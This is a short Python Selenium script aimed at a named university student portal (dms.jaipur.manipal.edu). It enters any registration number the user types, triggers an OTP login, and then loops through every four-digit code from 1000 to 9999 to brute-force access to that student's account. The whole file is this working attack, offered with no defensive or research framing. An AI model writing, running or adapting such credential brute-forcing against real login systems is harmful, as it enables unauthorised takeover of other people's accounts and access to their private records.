import time,sys
from selenium import webdriver
userid=int(input("Enter your registration number "))
a=webdriver.Firefox()
a.get("https://dms.jaipur.manipal.edu/loginForm.aspx")
b=a.find_element_by_css_selector("#txtUserid")
b.send_keys(userid)
c=a.find_element_by_css_selector("#hprlnkStduent")
c.click()
d=a.find_element_by_css_selector("#LnkStudentOTP")
d.click()

try:
    for i in range (1000,10000):
        a.find_element_by_css_selector("#TxtStduentOTP").send_keys(i)
        a.find_element_by_css_selector("#btnLoginByStdent").click()
        a.find_element_by_css_selector("#TxtStduentOTP").clear()
        
except:
    print("Done")
    sys.exit()